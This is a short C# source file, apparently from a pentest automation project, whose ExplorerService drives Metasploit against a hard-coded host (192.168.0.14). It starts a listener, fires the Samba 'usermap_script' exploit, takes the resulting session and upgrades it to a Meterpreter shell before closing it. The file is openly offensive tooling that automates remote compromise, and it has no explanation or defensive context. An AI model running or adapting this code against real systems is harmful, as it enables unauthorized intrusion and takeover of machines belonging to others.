using System.Threading.Tasks;
using Lacey.Alexa.Common.Metasploit.Extensions;
using Lacey.Alexa.Common.Metasploit.Providers;
using Microsoft.Extensions.Logging;

namespace Lacey.Alexa.Explorer.Services.Services.Concrete
{
    public sealed class ExplorerService : IExplorerService
    {
        private readonly ILogger _logger;

        private readonly IMetasploitProvider _metasploit;

        public ExplorerService(
            IMetasploitProvider metasploit, 
            ILogger logger)
        {
            _metasploit = metasploit;
            _logger = logger;
        }

        public async Task Run()
        {
            const string rHost = "192.168.0.14";
            const string exploit = "multi/samba/usermap_script";

            _logger.LogTrace("Starting listener...");
            var result = await _metasploit.MultiHandler();
            await _metasploit.Exploit(exploit, rHost);

            _logger.LogTrace("Obtaining session...");
            var sessionId = await _metasploit.ObtainSession(exploit, result.JobId);

            _logger.LogTrace("Upgrading session to Meterpreter...");
            var meterpreterId = await _metasploit.ObtainMeterpreter(sessionId);
            await _metasploit.Meterpreter(meterpreterId);
            
            _logger.LogTrace("Closing session...");
            await _metasploit.StopSession(sessionId);
        }
    }
}